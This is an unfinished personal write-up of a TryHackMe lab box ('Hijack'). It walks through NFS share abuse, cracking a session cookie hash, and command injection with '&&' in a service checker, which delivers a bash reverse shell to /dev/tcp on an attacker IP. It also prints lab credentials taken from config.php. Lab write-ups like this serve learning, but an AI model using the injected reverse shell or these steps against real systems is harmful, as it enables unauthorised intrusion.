Quick port scan
```bash
┌──(kali㉿kali)-[~]
└─$ nmap -p- --min-rate=10000 10.10.129.86     
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-16 16:17 EEST
Warning: 10.10.129.86 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.129.86
Host is up (0.23s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
2049/tcp  open  nfs
39661/tcp open  unknown
44419/tcp open  unknown
53852/tcp open  unknown
58280/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 18.24 seconds
                                                                                                          
┌──(kali㉿kali)-[~]
└─$ nmap -p 21,22,80,111,2049 -sC -sV 10.10.129.86
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-16 16:17 EEST
Nmap scan report for 10.10.129.86
Host is up (0.32s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:ee:e5:23:de:79:6a:8d:63:f0:48:b8:62:d9:d7:ab (RSA)
|   256 42:e9:55:1b:d3:f2:04:b6:43:b2:56:a3:23:46:72:c7 (ECDSA)
|_  256 27:46:f6:54:44:98:43:2a:f0:59:ba:e3:b6:73:d3:90 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Home
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      37900/udp6  mountd
|   100005  1,2,3      39661/tcp   mountd
|   100005  1,2,3      44229/tcp6  mountd
|   100005  1,2,3      52720/udp   mountd
|   100021  1,3,4      41041/tcp6  nlockmgr
|   100021  1,3,4      41753/udp   nlockmgr
|   100021  1,3,4      44419/tcp   nlockmgr
|   100021  1,3,4      57081/udp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
2049/tcp open  nfs     2-4 (RPC #100003)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.31 seconds
```
There is a login screen and it reveals if there is an account named like that.

The user can't be bruteforced since after 5 failed logins in locks the account for multiple minutes.

I was stuck for a while. But atleast there was nfs port open. Its kinda like ftp.
In the tryhackme "bio" it said that you have to abuse wrong configurations so i feel like this is our way out of this mess.

```bash
showmount -e 10.10.129.86  
Export list for 10.10.129.86:
/mnt/share *
```
The star next to the share tell's that it's shared for everyone

This was all new to me so it may be incorrect etc..

```bash
showmount -e <ip> //to see whats inside

make a directory where you mount it example mkdir /tmp/files

sudo mount -t nfs<ip>:/mnt/share /tmp/files

AND THEN IF YOU ARE NOT ABLE TO READ IT YOU HAVE TO CREATE AND USER WITH THE SAME UID SO YOU ARE ABLE TO SEE IT
```

```bash
$ cd /tmp
$ cd nfs
$ ls -la
total 8
drwx------  2 john john 4096 Aug  8  2023 .
drwxrwxrwt 22 root root  500 Aug 16 18:24 ..
-rwx------  1 john john   46 Aug  8  2023 for_employees.txt
$ cat for_employees.txt
ftp creds :

ftpuser:W3stV1rg1n14M0un741nM4m4
```


```bash
cat .from_admin.txt  
To all employees, this is "admin" speaking,
i came up with a safe list of passwords that you all can use on the site, these passwords don't appear on any wordlist i tested so far, so i encourage you to use them, even me i'm using one of those.

NOTE To rick : good job on limiting login attempts, it works like a charm, this will prevent any future brute forcing.
```

Ok so we got a password list and we know the admin uses one of these.

We were able to login and there is an admin panel where we are able to run different codes. we are gonna try and get a revshell from it

The cookie that is used is in base64 and it reveals the hashed md5 of the password. But since we know the list of passwords used, we can crack it without the login limit bothering us.

```bash
d6573ed739ae7fdfb3ced197d94820a5:uDh3jCQsdcuLhjVkAy5x     
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: d6573ed739ae7fdfb3ced197d94820a5
Time.Started.....: Sat Aug 16 18:53:24 2025 (0 secs)
Time.Estimated...: Sat Aug 16 18:53:24 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (passwords_list.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1239.2 kH/s (0.01ms) @ Accel:512 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 150/150 (100.00%)
Rejected.........: 0/150 (0.00%)
Restore.Point....: 0/150 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: Vxb38mSNN8wxqHxv6uMX -> 8yP4Ktdw2tsGdGj58sHQ
```

We are kinda able to break the service status checker with && but having trouble to get the revshell

```bash
crontab && whoami

* cron.service - Regular background program processing daemon
   Loaded: loaded (/lib/systemd/system/cron.service; enabled; vendor preset: enabled)
   Active: active (running) since Sat 2025-08-16 13:16:31 UTC; 2h 57min ago
     Docs: man:cron(8)
 Main PID: 1042 (cron)
    Tasks: 1
   Memory: 4.9M
      CPU: 259ms
   CGroup: /system.slice/cron.service
           `-1042 /usr/sbin/cron -f
www-data

```

```bash
cron && bash -c "sh -i >& /dev/tcp/10.6.25.159/4444 0>&1"
```
I managed to get a shell with this.

I imported linpeas.sh over

```bash
www-data@Hijack:/var/www/html$ cat config.php
cat config.php
<?php
$servername = "localhost";
$username = "rick";
$password = "N3v3rG0nn4G1v3Y0uUp";
$dbname = "hijack";

// Create connection
$mysqli = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($mysqli->connect_error) {
  die("Connection failed: " . $mysqli->connect_error);
}
?>
```

We were able to log into rick and i run the script again since we have new priviledges

```bash
Matching Defaults entries for rick on Hijack:                                                             
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_LIBRARY_PATH
```
the env_keep+=LD_libary_path was flagged by the linpeas so im going to research whats going on with it

to be continued maybe some day...
